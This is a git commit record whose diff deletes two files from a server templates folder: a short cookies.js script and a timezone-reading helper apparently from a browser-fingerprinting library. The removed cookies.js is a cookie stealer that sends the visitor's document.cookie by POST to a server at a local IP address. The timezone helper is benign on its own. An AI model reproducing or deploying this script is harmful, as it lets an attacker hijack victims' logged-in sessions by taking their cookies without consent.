fa07dfd55ae32434b8421db01a7ca71212112578
juanga333 <juangaruiz19@gmail.com>
2021-06-07 19:33:21 +0200

    p

--- server/templates/cookies.js
+++
@@ -1,5 +0,0 @@
-var server = "http://192.168.0.171:8081/cookies";
-var x = new XMLHttpRequest();
-x.open("POST", server, true);
-x.send(document.cookie);
-
--- server/templates/fp/src/sources/timezone.ts
+++
@@ -1,7 +0,0 @@
-export default function getTimezone(): string | undefined {
-  const DateTimeFormat = window.Intl?.DateTimeFormat
-  if (DateTimeFormat) {
-    return new DateTimeFormat().resolvedOptions().timeZone
-  }
-  return undefined
-}
